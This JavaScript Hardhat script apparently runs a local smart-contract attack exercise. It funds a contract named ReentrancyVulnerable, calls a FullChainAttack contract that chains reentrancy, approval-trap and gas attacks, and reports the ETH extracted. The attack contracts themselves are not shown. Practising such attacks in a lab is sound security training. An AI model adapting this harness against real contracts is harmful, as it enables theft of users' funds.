const hre = require("hardhat");

async function main() {
    const [attacker] = await hre.ethers.getSigners();
    console.log("[+] Full Chain Attack initiated");

    const deployments = require("../deployments.json");
    const full = await hre.ethers.getContractAt("FullChainAttack", deployments.FullChainAttack);

    const vuln = await hre.ethers.getContractAt("ReentrancyVulnerable", deployments.ReentrancyVulnerable);
    await vuln.deposit({value: hre.ethers.utils.parseEther("5")});

    const tx = await full.executeFullChain(
        deployments.ReentrancyVulnerable,
        deployments.ApproveTrap,
        deployments.GasAttack
    );
    await tx.wait();

    const total = await full.totalExtracted();
    const steps = await full.getSteps();

    console.log("[✓] Full chain attack complete");
    console.log("    Steps executed:", steps.length);
    console.log("    Total extracted:", hre.ethers.utils.formatEther(total), "ETH");

    for (let i = 0; i < steps.length; i++) {
        console.log(`    [${i+1}] ${steps[i].name}: ${hre.ethers.utils.formatEther(steps[i].profit)} ETH`);
    }
}

main().catch(console.error);
